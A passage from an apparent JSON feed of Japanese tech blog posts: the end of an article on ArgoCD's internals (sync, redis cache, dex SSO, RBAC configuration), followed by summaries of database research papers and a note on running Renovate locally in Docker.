 # Clusterにマニフェストをデプロイする。ArgoCDのSync機能に相当する。│    └── utils  # 他のパッケージに汎用的な関数を提供する。│...gitops-engine/specs/design-top-down.md at v0.7.0 \xb7 argoproj/gitops-engine \xb7 GitHub(5) application-controllerによるマニフェスト差分検出application-controllerは、プロダクト用Clusterのマニフェストと、repo-serverから取得したマニフェストの差分を検出します。ここで、kubectl diffコマンドの実行が自動化されています。(6) application-controllerによる処理結果保管application-controllerは、処理結果をredis-serverに保管します。redis-serverは、Applicationやリポジトリのコミットの単位で、application-controllerの処理結果を保管しています。$ kubectl exec -it argocd-redis-server \\\\    -n foo \\\\    -- sh -c \\"redis-cli --raw\\"127.0.0.1:6379> keys *...app|resources-tree|<Application名>|<キャッシュバージョン>cluster|info|<プロダクト用ClusterのURL>|<キャッシュバージョン>git-refs|<マニフェスト/チャートリポジトリのURL>|<キャッシュバージョン>mfst|app.kubernetes.io/instance|<Application名>|<最新のコミットハッシュ値>|<デプロイ先Namespace>|*****|<キャッシュバージョン>...(7) application-controllerによるマニフェストデプロイapplication-controllerは、Applicationの操作に応じて、Clusterにマニフェストをデプロイします。ここで、kubectl applyコマンドの実行が自動化されています。▶ application-controllerがマニフェストを操作した証拠についてmetadata.managedFieldsキーがあり、何がそのマニフェストを作成/変更したのかを確認できます。実際にマニフェストを確認してみると、確かにapplication-controllerがマニフェストを作成/変更してくれたことを確認できます。apiVersion: apps/v1kind: Deploymentmetadata:  managedFields:    # ArgoCDのapplication-controllerによる管理    - manager: argocd-application-controller      apiVersion: apps/v1      # kube-apiserverに対するリクエスト内容      operation: Update      time: \\"2022-01-01T16:00:00.000Z\\"      # ArgoCDのapplication-controllerが管理するマニフェストのキー部分      fields: ...️Server-Side Apply | Kubernetes05. dex-serverdex-serverとはインフラレイヤーにあるdex-serverです。SSO (例：OAuth 2.0、SAML、OIDC) を採用する場合、argocd-serverの代わりに認可リクエストを作成し、またIDプロバイダー (例：GitHub、Keycloak、AWS Cognito、Google Authなど) に送信します。これにより、argocd-server上の認証フェーズをIDプロバイダーに委譲できます。GitHub - dexidp/dex: OpenID Connect (OIDC) identity and OAuth 2.0 provider with pluggable connectors▶ dex-serverの必要性について2.0、SAML) を使用する場合は、dex-serverを採用する必要があります\uD83D\uDC4D️Overview - Argo CD - Declarative GitOps CD for Kubernetes仕組み(1) プロダクト用Cluster管理者のログインプロダクト用Cluster管理者がダッシュボード (argocd-server) にSSOを使用してログインしようとします。(2) IDプロバイダーへの認証フェーズ委譲argocd-serverは、認証フェーズをIDプロバイダーに委譲するために、dex-serverをコールします。▶ 認証フェーズの委譲についてAuthentication and Authorization - Argo CD - Declarative GitOps CD for Kubernetes(3) dex-serverによる認可リクエスト作成dex-serverは、認可リクエストを作成します。認可リクエストに必要な情報は、ConfigMap (argocd-cm) で設定しておく必要があります。argocd-cmのざっくりした実装例は以下の通りです\uD83D\uDC47ここでは、IDプロバイダーをGitHubとし、認可リクエストに必要なクライアントIDとクライアントシークレットを設定しています。apiVersion: v1kind: ConfigMapmetadata:  namespace: foo  name: argocd-cmdata:  dex.config: |    connectors:      - type: github        id: github        name: GitHub SSO        config:          clientID: *****          clientSecret: *****        # dex-serverが認可レスポンスによるリダイレクトを受信するURLを設定する        redirectURI: https://example.com/api/dex/callback▶ dex-serverの設定についてdex.configキー配下の設定方法は、dexのドキュメントをみるとよいです\uD83D\uDC4DAuthentication Through GitHub |(4) dex-serverによる認可リクエスト送信dex-serverは、前の手順で作成した認可リクエストをIDプロバイダーに送信します。(5) IDプロバイダーによる認証フェーズ実施IDプロバイダー側でSSOの認証フェーズを実施します。IDプロバイダーは、コールバックURL (<ArgoCDのドメイン名>/api/dex/callback) を指定して、認可レスポンスを送信します。認可レスポンスはリダイレクトを発生させ、argocd-serverを介して、再びdex-serverに届きます。この後、dex-serverはIDプロバイダーのトークンエンドポイントにリクエストを送信し、またIDプロバイダーからトークン (アクセストークン、IDトークンなど) やユーザー情報を取得します。ただ、SSOの種類によって仕組みが異なるため、詳細は省略します。▶ dex-serverのコールバックURLについてDeveloper settingsタブ でSSOを設定する必要があり、この時にAuthorization callback URLという設定箇所があるはずです\uD83D\uDC4D\uD83C\uDFFB(6) argocd-serverによる認可フェーズ実施argocd-serverは、AuthZで認可フェーズを実施します。ConfigMap (argocd-rbac-cm) を参照し、IDプロバイダーから取得したユーザーやグループに、ArgoCD系カスタムリソースに関する認可スコープを付与します。ざっくりした実装例は以下の通りです\uD83D\uDC47ここでは、developerロールにはdevというAppProjectに属するArgoCD系カスタムリソースにのみ、またmaintainerロールには全てのAppProjectの操作を許可しています。またこれらのロールを、IDプロバイダーで認証されたグループに紐づけています。特定のArgoCD系カスタムリソースのみへのアクセスを許可すれば、結果として特定のClusterへのデプロイのみを許可したことになります\uD83D\uDC4DapiVersion: v1kind: ConfigMapmetadata:  name: argocd-rbac-cm  namespace: foodata:  # デフォルトのロール  policy.default: role:developer  policy.csv: |    p, role:developer, *, *, dev/*/*, allow    p, role:maintainer, *, *, dev/*/*, allow    p, role:maintainer, *, *, prd/*/*, allow    g, developers, role:developer    g, maintainers, role:maintainer  scopes: \\"[groups]\\"▶ AppProjectの認可定義の記法についてCasbin の記法を使用します。今回の実装例で使用したp (パーミッション) とg (グループ) では、以下を記法を使用できます\uD83D\uDC4DapiVersion: v1kind: ConfigMapmetadata:  name: argocd-rbac-cm  namespace: argocddata:  policy.default: role:readonly  policy.csv: |    # ロールとArgoCD系カスタムリソースの認可スコープを定義する    p, role:<ロール名>, <Kubernetesリソースの種類>, <アクション名>, <AppProject名>/<ApplicationのNamespace名>/<Application名>, <許否>    # 認証済みグループにロールを紐付ける    g, <グループ名>, role:<ロール名>  scopes: \\"[groups]\\"RBAC Configuration - Argo CD - Declarative GitOps CD for Kubernetes06. argocd-server (argocd-apiserver)argocd-serverとは最後に、インフラレイヤーにあるargocd-serverです。『argocd-apiserver』とも呼ばれます。みんながよく知るArgoCDのダッシュボードです。また、ArgoCDのAPIとしても機能し、他のコンポーネントと通信します\uD83E\uDD84仕組み(1) application-controllerによるヘルスチェックapplication-controllerは、プロダクト用Clusterをヘルスチェックします。(2) application-controllerによるマニフェスト差分検出application-controllerは、プロダクト用Clusterのマニフェストと、ポーリング対象のリポジトリのマニフェストの差分を検出します。(3) application-controllerによる処理結果保管application-controllerは、処理結果をredis-serverに保管します。(4) application-controllerによる処理結果取得argocd-serverは、redis-serverから処理結果を取得します。(5) プロダクト用Cluster管理者のログインプロダクト用Cluster管理者がダッシュボード (argocd-server) にSSOを使用してログインしようとします。(6) IngressコントローラーによるルーティングIngressコントローラーは、Ingressのルーティングルールを参照し、argocd-serverにルーティングします。(7) IDプロバイダーへの認証フェーズ委譲argocd-serverは、ログイン時にIDプロバイダーに認証フェーズを委譲するために、dex-serverをコールします。(8) IDプロバイダーによる認証フェーズ実施IDプロバイダー上で認証フェーズが完了します。argocd-serverは、ConfigMap (argocd-rbac-cm) を参照し、プロダクト用Cluster管理者に認可スコープを付与します。(9) argocd-serverによる認可フェーズ実施argocd-serverは、認可スコープに応じて、プロダクト用Cluster管理者がApplicationを操作可能にします。▶ NamespacedスコープモードについてapiVersion: v1kind: ConfigMapmetadata:  name: argocd-cmd-params-cm  namespace: foodata:  # 設定してはダメ  # application.namespaces: \\"*\\" # 全てのNamespaceを許可する。apiVersion: argoproj.io/v1alpha1kind: AppProjectmetadata:  name: dev-foo-project  namespace: foospec:  # 設定してはダメ  # sourceNamespaces:  #  - \\"foo\\"これらにより、fooのNamespaceに属するArgoCDは、他のNamespaceにはアクセスできなくなります\uD83D\uDC4DInstallation - Argo CD - Declarative GitOps CD for Kubernetes(10) application-controllerによるマニフェストデプロイプロダクト用Cluster管理者は、ダッシュボード (argocd-server) を使用して、ClusterにマニフェストをSyncします。この時、Applicationを介してapplication-controllerを操作し、マニフェストをデプロイします。図では、App Of Appsパターンを採用したと仮定しています\uD83D\uDC68‍\uD83D\uDC69‍\uD83D\uDC67‍\uD83D\uDC66▶ App Of Appsパターンについて07. アーキテクチャのまとめ今までの全ての情報をざっくり整理して簡略化すると、ArgoCDは以下の仕組みでマニフェストをデプロイすることになります\uD83D\uDC4708. おわりにArgoCDによるデプロイの仕組みの仕組みをもりもり布教しました。ArgoCDは、UIが使いやすく、仕組みの詳細を知らずとも比較的簡単に運用できるため、ユーザーフレンドリーなツールだと思っています。もしArgoCDを使わずにマニフェストをデプロイしている方は、ArgoCDの採用をハイパー・ウルトラ・アルティメットおすすめします\uD83D\uDC4D謝辞ArgoCDの設計にあたり、以下の方に有益なプラクティスをご教授いただきました。@yaml_villager さんこの場で感謝申し上げます\uD83D\uDE47\uD83C\uDFFB‍記事関連のおすすめ書籍GitOps Cookbook: Kubernetes Automation in Practice (English Edition)作者:Vinto, Natale,Bueno, Alex SotoO\'Reilly MediaAmazonGitOps and Kubernetes: Continuous Deployment with Argo CD, Jenkins X, and Flux作者:Yuen, Billy,Matyushentsev, Alexander,Ekenstam, Todd,Suen, JesseManning PublicationsAmazon","isoDate":"2023-05-02T05:42:57.000Z","dateMiliSeconds":1683006177000,"authorName":"長谷川 広樹","authorId":"hiroki-hasegawa"},{"title":"現代のクエリオプティマイザの基礎となる技術をまとめた論文を読みました","link":"https://nnaka2992.hatenablog.com/entry/cmu_reading_assignments/15_query_optimization_overview","contentSnippet":"この記事の趣旨1998年に発表されたクエリオプティマイザの基礎としてとくに重要な手法をまとめた論文を読みました。An Overview of Query Optimization in Relational Systems著者についてSurajit Chaudhuriによる論文Microsoft所属の研究者でRDBMSの研究を行なっており、近年ではCloudにおけるDBMSの研究を行なっている。概要RDBMSが提案された1970年代からクエリ最適化は大規模で幅の広く研究が行なわれてきた。この論文では執筆当時(1998年)までの重要な研究の基礎を説明している。手法探索空間統計情報とコストの推定列挙アルゴリズムアルゴリズムについて説明している。論文内では拡張可能なオプティマイザとして、StarburstとVolcano/Cascadeの2種類のオプティマイザの詳細を論じている。最新(当時)の最適化リアライズドビューについて説明している。作業時間read31:4031:40author33:402:00summary52:5519:15感想ベクトル化やパラレルジョインで扱われていたVolcanoオプティマイザの端に触れることが出来ました。内容としては基礎的な内容が多いものの、知らない概念もいくつかあり引用している論文も読みたいです。クエリ最適化の基礎を学ぶのに非常にいい内容でした。","isoDate":"2023-05-02T01:54:29.000Z","dateMiliSeconds":1682992469000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"DBMSとクライアント間におけるデータ転送を最適化する論文を読みました","link":"https://nnaka2992.hatenablog.com/entry/cmu_reading_assignments/14_data_transfer_between_server_and_client","contentSnippet":"この記事の趣旨2017年に出版されたリモートDBMSとクライアント間の大量データ転送を最適化する手法を提案する論文を読みました。Don’t Hold My Data Hostage – A Case For Client Protocol Redesign著者についてMark Raasveldt、Hannes Muhleisenらのグループによる論文。いずれもCentrum Wiskunde & Informaticaの所属で、DuckDBのCxO。DBMSと分析システムにおけるパフォーマンス最適化を研究している。問題意識DBMSからクライアントプログラムに大量のデータを転送することは一般的なタスクである。例えばRやPythonなどを用いた分析システムはしばしばデータベース・インターフェースを利用してデータの取得を行なっている。一方でネットワーク越しにデータを転送することはレイテンシを増加させ、転送時間を長引かせる要因である。そのため分析用途で大量のデータ転送を避け、一部のデータをサンプルとして利用するに止まることが多い。このアプローチはパフォーマンスの低下を押さえられるものの、分析や機械学習の精度を下げることに繋がる。とくに既存のクライアントではネットワークによるレイテンシとスループットの制限に大きな影響を受けパフォーマンスを劣化させる。この問題はデータベースが別マシンやクラウドで動作するときにより大きな問題となる。手法本論文では既存のシリアライズ手法と圧縮手法によるパフォーマンスへの影響を計測し、新しいプロトコルとして以下の特性を持つ手法を提案している。1. チャンク毎のデータ転送と(デ)シリアライゼーション1. ヒューリスティックによる圧縮方法の決定1. text/binaryによるカスタムシリアライゼーションを使用する1. NULL終端によるテキストの取り扱い実験結果提案手法を実装したMonetDB(表内ではMonetDB++)とPostgreSQL(表内ではPostgreSQL++)を既存のDBMSやnetcatと比較することで評価を行なっている。TCP-Hのlineitem、American Community Survay、Airline On-Time Statisticsの3つのデータセットで評価を行なったところ、ローカル通信における非圧縮netcatを除き殆どのケースでMonetDB++系が最良のパフォーマンスを発揮し次点でPostgreSQL++系が優れた結果を残している。Table 10Table 11Table 12PostgreSQLに比べMonetDBが優れている理由はPostgreSQLの行指向データを列指向に変換するコストのためである。作業時間read31:2131:21author35:384:17summary70:1334:35感想論文出版時にはTPC/IPプロトコルが前提でQuic登場前のため、ネットワークプロトコル自体は考慮されていない。現在であればTPC/IPとQuicに適合した手法の比較が行なわれると思うので気になるところ。","isoDate":"2023-05-01T03:34:18.000Z","dateMiliSeconds":1682912058000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"SQL ServerにおけるUDF最適化の論文を読みました","link":"https://nnaka2992.hatenablog.com/entry/cmu_reading_assignments/13_sql_server_udf_optimization","contentSnippet":"この記事の趣旨2017年に発表されたSQL ServerでUDFを最適化しているFroidという手法についての論文を読みました。Froid: Optimization of Imperative Programs in a Relational Database著者についてKarthik Ramachandra、Kwanghyun Park、K. Venkatesh Emani、Alan Halverson、Cesar Galindo-Legaria、Conor Cunninghamのグループによる論文。ほとんどの著者はMicrosoftに所属しており、いずれもトランザクショナルワークロードでのRDBMSの最適化や分析ワークロードにおけるRDBMS最適化の研究をしている。問題意識RDBMSではSQLによるデータ処理アプローチと、UDFやストアドプロシージャなどによる命令型のデータ処理アプローチを提供している。SQLによるデータアクセスは高度に最適化されてきた一方で、命令型のデータ処理は非効率なため性能を阻害し利用を禁止している組織すらある。UDFによるデータアクセスは非効率であるものの、SQLに比べ下記のような利点を提供するため幅広く利用されているのも事実である。1. SQL間でコードの再利用方法を提供する1. 複雑なビジネスロジックやMLアルゴリズムなどSQLでは難しい表現を可能にする1. 単純なSQLの組み合わせのため、ユーザーの意図が明確に表現できるこれらのメリットを享受するためにRDBMSにおける命令型データアクセス手法のパフォーマンスを向上しする必要があった。手法提案手法であるFroidはMicrosoft SQL Serverにおける命令型コードのパフォーマンス向上の手法として、UDFを複雑なサブクエリとしてみなすアプローチを取っている。UDFを構成する命令はDECLARE、SELECT、IF/ELSE、RETURN、他のUDF、リレーショナルオペレーションの6つに分ることができる。提案手法ではこれらの命令を一般的なT-SQLに置き換え、Apply演算により一つの関係式に結合する方法で実現している。Table 1命令が一般SQLに置き換えられることでUDFに対して、SQLに用いられていた高度な最適化を導入することが出来る。また提案手法ではい以下の理由から、SQLとして命令を置換するときにクエリ最適化時に行なうのではなくバインド時に置換をしている。1. 実際のワークロードでの実験ではほぼ全てのケースでバインド時のほうが性能がよかった1. クエリオプティマイザの変更が不要1. バインディング時に特定の最適化を行なえるとくにクエリオプティマイザの変更はSQL Serverが商用データベースなため重要であった。作業時間read28:5028:50author32:103:20summary57:0024:50","isoDate":"2023-04-28T02:29:05.000Z","dateMiliSeconds":1682648945000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"DBMSの歴史とNewSQL","link":"https://zenn.dev/nnaka2992/articles/history_of_db_and_newsql","contentSnippet":"この記事はDBMSの登場以前から現代のDBMSを取り巻く環境までを振り返ることで、なぜNewSQLが必要とされ登場したのかをまとめます。 おことわり筆者はあくまでDBMSユーザーであり、研究者ではないため内容は個人の見解です。また対象読者はある程度DBMSに関わりがあり、OLTPやOLAP、列指向や行指向といった基本的な単語を理解しているものとします。またNewSQLの技術的詳細はスコープ外とします。 DBMS以前データベースという言葉は1950年代に米軍が情報基地を集約したことに由来します。一方で学術的なデータベースの起源はW. C. McGeeが1959年に発表...","isoDate":"2023-04-26T14:28:19.000Z","dateMiliSeconds":1682519299000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"中間結果が莫大になるときの結合を最適化する最悪ケース最適化結合をRDBMSに適応する論文を読みました","link":"https://nnaka2992.hatenablog.com/entry/cmu_reading_assignments/12_worst_case_optimal_join","contentSnippet":"この記事の趣旨2018年に発表された分析ワークロードなどで発生しがちな最終結果に比べ、非常に大きな中間結果を作成してしまうクエリを多方向結合で最適化する論文を読みました。Adopting Worst-Case Optimal Joins in Relational Database Systems著者についてMichael Freitag、Maximilian Bandle、Tobias Schmidt、Alfons Kemper、Thomas Neumannによるグループの論文いずれの著者もDBMSにおける最適化を中心に研究しており、それぞれ分析ワークロードにおける最適化や最新のハードウェアにおける最適化などを研究している。問題意識従来のRDBMSにおける結合処理のほとんどはバイナリ結合に依存して複数のリレーションにまたがるクエリを処理してきた。数十年に渡る研究によりバイナリ結合は幅広い柔軟性と優れた性能を発揮するようになった。その一方でバイナリ結合による実行計画は特定のワークロードでは最適ではないケースを示すことが知られている。主な原因として実際のクエリ結果に比べて非常に大きな中間結果を生成するためである。とくにPK以外のキーによる結合が多くなる分析ワークロードではそのような状態を避けることが難しく、またグラフ分析のようなクエリパターンでも多く見られる。近年の論理的な進歩により中間結果の列挙を避ける多方向結合のアルゴリズムが開発可能になった。この手法はバイナリ結合計画より優れた実行時間を保証できるため、RDBMSの堅牢性を大幅に向上させる可能性を持っている。しかし現状最悪ケース最適化結合アルゴリズムでは以下のような問題を抱えている。1. 膨大なストレージとメンテナンスを必要とする結合に参加出来るカラムを含むインデックスを必要とする。1. RDBMSは挿入と更新のサポートが必要なものの、既存のアルゴリズムは高価な事前計算を必要とする。そのため本論文は以下の制約を満たすアプローチを提案している1. 多方向結合が有益な場合のみ多方向結合を使用するオプティマイザを必要とする。1. 実行中に効率的に実行でき、ディスクのに永続化する必要のないパフォーマントインデックスを必要とする。手法提案手法では比較ベースではなくハッシュベースの結合のため、2の「実行中に効率的に実行でき、ディスクのに永続化する必要のないパフォーマントインデックスを必要とする。」という要素の考慮を除いている。またオプティマイザについては既存のコストベースのものを拡張し適応している。提案手法では潜在的に成長している結合のカスケードを最悪の場合の最適結合に置き換えることで、最適化されたバイナリ結合計画を洗練させるヒューリスティックなアプローチを提案している。通常の結合順序最適化で使用されるのと同じカーディナリティ推定値に基づいて、中間テーブルが膨大になる結合を特定する。作業時間read22:1322:13author25:483:35summary52:5826:50感想とても難しい内容に感じてしまい、殆ど頭を通りすぎてしまった気がする。今まで最適化は触れずに来たため、理解が浅い領域だった。よくよく考えるとDBMSの話しに最適化が登場するのはあたりまえなので、今後はその方面にも触れて行きたい。","isoDate":"2023-04-26T02:06:46.000Z","dateMiliSeconds":1682474806000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"マルチコアメインメモリにおけるソートジョインとハッシュジョインのパフォーマンスを検証した論文を読みました","link":"https://nnaka2992.hatenablog.com/entry/cmu_reading_assignments/11_join_performance_comparison","contentSnippet":"この記事の趣旨2013年に発表された\\"Multi-Core, Main-Memory Joins: Sort vs. Hash Revisited\\"という論文を読みました。当時最新のアルゴリズムとハードウェアにおける、ソートとハッシュによる結合のパフォーマンスを比べた論文です。Multi-Core, Main-Memory Joins: Sort vs. Hash Revisited著者についてCagri Balkesen、Gustavo Alonso、Jens Teubner、M. Tamer Ozsuらのグループによる論文いずれもDBMSにおけるクエリ最適化やビッグデータにおけるパフォーマンスを研究している。またGustavo Alonsoはハードウェアや分散システムもメインのフィールドとしている。問題意識DBMSにおいて常にソートマージとハッシュ結合の性能比較が行われており、最新の研究ではSIMDやNUMAへの適正に基づいてソートマージがより優れていると結論づけられていた。しかしこれらの分野は常に研究が重ねられ、過去の検証時には登場していなったハッシュ結合の最適化手法が生れた。この論文ではそれらを適用し再度ソートマージとハッシュ結合の性能比較を行なう。手法本論文では以下に分けて結合手法の評価を行なっている。1. ソートフェーズの評価SIMDソートアルゴリズムとC++のSTLソートアルゴリズムを比較している。マージフェーズの評価入力サイズの調整によるマージフェーズの最適化パーマンスを検証している。ソートマージジョインにおける影響要因の特定結果結合対象のデータサイズに拘わらずハッシュによる結合がソートベースの結合のパフォーマンスを上回っている。Figure 14ソートマージによる結合は入力サイズが著しく大きくなったときのみハッシュ結合のパフォーマンスに近づく。Figure 15ソートマージ、ハッシュ結合におけるデータの偏りはパフォーマンスに大きな影響を及ぼさなかった。Figure 16いずれのアルゴリズムも物理的なコア数では線形にスケールした。Figure 17作業時間read23:1123:11author27:093:58summary60:1232:57","isoDate":"2023-04-24T02:23:54.000Z","dateMiliSeconds":1682303034000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"RDBでの結合手法を比較した論文を読みました","link":"https://nnaka2992.hatenablog.com/entry/cmu_reading_assignments/10_join_method_comparison","contentSnippet":"この記事の趣旨2016年に発表された\\"An Experimental Comparison of Thirteen Relational Equi-Joins in Main Memory\\"という論文を読みました。様々な結合手法を包括的に比較した論文でどのような結合方法がどのような時に適しているかを示しています。An Experimental Comparison of Thirteen Relational Equi-Joins in Main Memory著者についてStefan Schuh、Xiao Chen、Jens Dittrichのグループによる論文。いずれもDBMSや分析システム、Hadoopなどにおける検索高速化・最適化の研究を行なっている。問題意識関係結合はほとんど全てのクエリプランにおいて中核をなす処理であり、定期的に研究・改良され再検討されてきた。新たな手法が提案され実験を行なわれるものの、それぞれ結果において比較を困難にする要素や幾らかの矛盾を孕んでいた。例えば同じハッシュベースの結合アルゴリズムの比較でも実装が異なったり、複数の論文でパフォーマンス比較で正反対の結果を示しているためである。そのため単純に論文執筆時点で最も高速な結合アルゴリズムを結論づけることが困難であった。手法本論文では結合方法を以下の3つに分類した1. パーティションベースハッシュジョインパーティションに分割し結合する手法。ハッシュテーブルの構築と結合されるデータの探索のキャッシュミスを最小にする事を目的としている。非パーティションベースハッシュジョインパーティションテーブルを構築しながら結合を行なう手法で、マルチスレッドと順番に依存しない実行によりキャッシュミスのパフォーマンス劣化を隠蔽している。ソートマージジョインSIMDによりベクトル化される。検証ではこれらの結合方法を以下の3つのテストで使用するために、全部で13のアルゴリズムを検証している。1. ブラックボックス比較ブラックボックス的に比較する。ホワイトボックス比較ブラックボックス比較で検証する結合方法に先行研究で示された最適化を施した上で比較を行なう。パラレルラディックスジョイン比較Table 2結果パーティション結合の一種であるリモート書込みを排除したCPR系アルゴリズムは小さな入力に対して有効ではないスケールの大きい結合ではとくに理由が無い場合、パーティションベースのジョインを利用する大きなサイズのページを利用するソフトウェアライトコンバインバッファ()を利用するパーティションジョインでは適切なパーティションビットを利用するできるかぎりシンプルなアルゴリズムを利用するNUMAを考慮したアルゴリズムを利用する実行時間とクエリ時間は同一ではない作業時間read31:3431:34author35:183:46summary77:5042:32","isoDate":"2023-04-23T14:16:28.000Z","dateMiliSeconds":1682259388000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"コンパイルとベクトル化による最適化のパフォーマンスを比較した論文を読みました","link":"https://nnaka2992.hatenablog.com/entry/cmu_reading_assignments/9_compile_vs_vectorize_performance","contentSnippet":"この記事の趣旨2018年に発表された\\"Everything You Always Wanted to Know AboutCompiled and Vectorized Queries But Were Afraid to Ask\\"という論文を読みました。最新のクエリエンジンの特性をまとめ、どのようなワークロードに向くのかという指針を示すないようです。Everything You Always Wanted to Know About Compiled and Vectorized Queries But Were Afraid to AskTimo Kersten, Viktor Leis, Alfons Kemper, Thomas Neumann, Andrew Pavlo, Peter Boncz著者についてTimo Kersten, Viktor Leis, Alfons Kemper, Thomas Neumann, Andrew Pavlo, Peter Bonczのグループによる論文。いずれも大規模データにおけるクエリパフォーマスや最適化に関する研究を行なっている。問題意識分析ワークロードに向いた最新のクエリエンジンはベクトル化またはデータ中心のコード生成に基づいている。どちらのモデルも従来のエンジンに比べオーバーヘッドが少く、非常に効率的なものの概念的には大きく異なっている。この2つのモデルの違いは、DBMSの実行エンジンのソースコードの構成とその性能特性を決定する基本的なもので、クエリ実行モデルを超える多くの設計で異なる。本論文はことなる2つのモデルを再実装し、環境差異のないマシンで実行することでそれぞれのモデルがどのように違うのか。どのような用途に最適なのかを検証している。手法検証手法は著者らがC++で再実装したデータ中心モデルの「Taper」とベクトル化中心の「Tectorwise」を同一のマシンでパフォーマンス検証を行っている。検証項目は以下から成る1. インメモリOLAPワークロードでのマイクロアーキテクチャ分析1. SIMDの利点の検証1. マルチコアCPUにおけるクエリ並列化1. 異なるハードウェアでのパフォーマンス結果インメモリOLAPワークロードでのマイクロアーキテクチャ分析Figure 3: Performance – TPC-H SF=1, 1 threadSIMDの利点の検証SIMDを評価するにはTectorwiseのみを用いた。SIMDではスカラーなデータをベクトルに変換するペナルティは少く、最大8.4倍の性能向上が確認された。Figure 6: Scalar vs. SIMD Selection in TectorwiseマルチコアCPUにおけるクエリ並列化異なるハードウェアでのパフォーマンスIntel Skylake、Intel Knights Landing、AMD Ryzenで対照実験を行なったものの、いずれのハードウェアでもTyper、Tectorwiseともに有効に動作した。作業時間read29:2629:26author33:233:57summary76:3742:44感想VoectorwiseとHyperのいずれを使うべきか。どちらが優れているかといった疑問に答えるないようだった。","isoDate":"2023-04-21T01:45:06.000Z","dateMiliSeconds":1682041506000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"Renovateをローカルで動かす","link":"https://kechigon.hatenablog.com/entry/2023/04/20/140449","contentSnippet":"Renovateには様々な実行方法がありますが。ここではローカルで動かす方法について説明します。Renovateをクローンするhttps://github.com/renovatebot/renovateからクローンしましょう。これ以降はクローンしたリポジトリのルートディレクトリで作業します。実行環境コンテナ.devcontainer/Dockerfileをビルドします。docker build -f .devcontainer/Dockerfile -t renovatebot_local .Renovateの依存パッケージをインストールdocker run -it --rm -v \\"$PWD\\":/usr/src/app -w /usr/src/app renovatebot_local yarnローカル実行時のオプションドキュメントを参考に、引数を与えてください。ログレベルdebugでGitLabリポジトリに対して実行する場合は、以下のようになります。例：docker run -it --rm -v \\"$PWD\\":/usr/src/app -w /usr/src/app -e LOG_LEVEL=debug -e GITHUB_COM_TOKEN=*** renovatebot_local yarn start --platform gitlab --token *** {リポジトリ}※{リポジトリ}のところはユーザー名/リポジトリ名のような感じです。","isoDate":"2023-04-20T05:04:49.000Z","dateMiliSeconds":1681967089000,"authorName":"Kurita Keigo","authorId":"kurita"},{"title":"SIMDによるベクトル処理の最適化とRDBでの応用について扱った、最適化に関する論文を読みました","link":"https://nnaka2992.hatenablog.com/entry/cmu_reading_assignments/8_counter_control_flow_divergence_in_compiled_query_pipelines","contentSnippet":"この記事の趣旨2020年に提案された\\"Make the most out of your SIMD investments: counter control flowdivergence in compiled query pipelines\\"という論文を読みました。SIMDによるベクトル処理の最適化とRDBでの応用について扱った、最適化に関する論文です。Make the most out of your SIMD investments: counter control flow divergence in compiled query pipelinesHarald Lang, Linnea Passing, Andreas Kipf, Peter Boncz, Thomas Neumann, Alfons Kemper著者についてHarald Lang、 Linnea Passing、 Andreas Kipf、 Peter Boncz、 Thomas Neumann、 Alfons Kemperのグループによる研究いずれも最新のアーキテクチャでのクエリ最適化やデータ分析における検索手法などを研究している。問題意識CPUの発展にともないあたらしいCPUアーキテクチャが登場した。Single Instruction Multiple Data(SIMD)ではRDBはSIMDによるベクトル処理能力の向上により、クエリコンパイラの実行パイプライン全体をベクトル化して高度なデータ並列性の恩恵を受けることが出来るようになった。一方でクエリ全体をベクトル化して実行することで、SIMDによるクエリ評価が忙しくなる。SIMD評価で結果に寄与しない評価が単純にオーバーヘッドとなってしまう。手法本論文ではリフィルアルゴリズムとそのアルゴリズムをクエリパイプラインプランに統合する手法で上記の問題の解決を試みている。リフィルアルゴリズムは基本的に新しい要素を宛先レジスタの希望する位置にコピーするアルゴリズムで、メモリからレジスタとレジスタからレジスタへのコピーの2パターンが存在する。クエリパイプラインプランに統合するリフィル戦略ではConsume EverythingパターンとPartial Consumeパターンが存在する。Consum Everything戦略は、タプルをバッファリングするために使用される追加のベクターレジスタを割り当てる方法で利用率が低い場合、オペレータはこれらのタプルの処理を延期する。つまり、この反復ではボディは実行されず(条件が満たされない場合)、代わりにアクティブなタプルがこれらのバッファレジスタに移動することになる。Partial Consume戦略ではconsume()コードを入力の一部に適用する方法で、制御フローを前のオペレータに戻し、アクティブなデータ断片のみをベクトルレジスタに残すことで実行を延期している。作業時間read29:4029:40author33:404:00summary60:0426:36感想前回に引続き個人的には難しいと感じる論文だった。2000年前後の提案にくらべ、2015年前後の論文ではハードウェアアーキテクチャを中心とした手法がピックアップされている。単純に自分の知識不足、理解力不足なので勉強するしかない。","isoDate":"2023-04-20T02:00:20.000Z","dateMiliSeconds":1681956020000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"NUMAアーキテクチャでのクエリ最適化に関する論文を読みました","link":"https://nnaka2992.hatenablog.com/entry/cmu_reading_assignments/7_numa_aware_query_evaluation_framework","contentSnippet":"この記事の趣旨\\"Morsel-Driven Parallelism: A NUMA-Aware Query Evaluation Framework forthe Many-Core Age\\"という2014年に発表された、多コアサーバにおけるクエリ最適化手法をあつかった論文を読みました。[Morsel-Driven Parallelism: A NUMA-Aware QueryEvaluation Framework for the Many-Core Age](https://15721.courses.cs.cmu.edu/spring2023/papers/07-scheduling/p743-leis.pdf)Viktor Leis, Peter Boncz, Alfons Kemper, Thomas Neumann著者についてViktor Leis、 Peter Boncz、 Alfons Kemper、Thomas Neumannのグループによる研究いずれもデータベースと 高速化かを中心に研究している。問題意識コンピュータアーキテクチャの進化にともない、二つのあたらしい問題が生じた。多コアを利用するためにクエリを数百のスレッドに均等に分散させるそれをNUMA(Non-Uniform Memory 